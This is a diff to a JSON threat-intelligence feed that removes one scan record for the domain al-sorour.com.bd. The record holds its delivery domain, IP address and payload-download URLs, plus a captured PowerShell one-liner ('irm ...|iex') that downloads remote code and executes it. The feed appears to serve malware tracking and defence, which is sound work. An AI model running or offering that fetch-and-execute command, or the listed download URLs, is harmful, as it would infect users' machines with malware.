@@ -1026,31 +1026,5 @@
     ],
     "ReportId": "cmwnxm1t71xj30oml4e26u03q",
     "ScannedAt": "2026-11-19T19:17:02.747000+00:00"
-  },
-  {
-    "UrlDomain": "al-sorour.com.bd",
-    "DeliveryUrl": [
-      "img-codes-cloude.info"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "161.118.245.37"
-    ],
-    "Related": [
-      {
-        "Value": "https://img-codes-cloude.info/621993c387443d46",
-        "Type": "payload download"
-      },
-      {
-        "Value": "https://img-codes-cloude.info/api.php?s=a3946e3ded820e3d2f02885bf63c8a3a176d58bb9403b402",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "irm 'img-codes-cloude[.]info/621993c387443d46'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://img-codes-cloude.info/621993c387443d46"
-    ],
-    "ReportId": "cmwnwrsgu1xi10omlj9jbvrk0",
-    "ScannedAt": "2026-11-19T18:53:30.900000+00:00"
   }
 ]
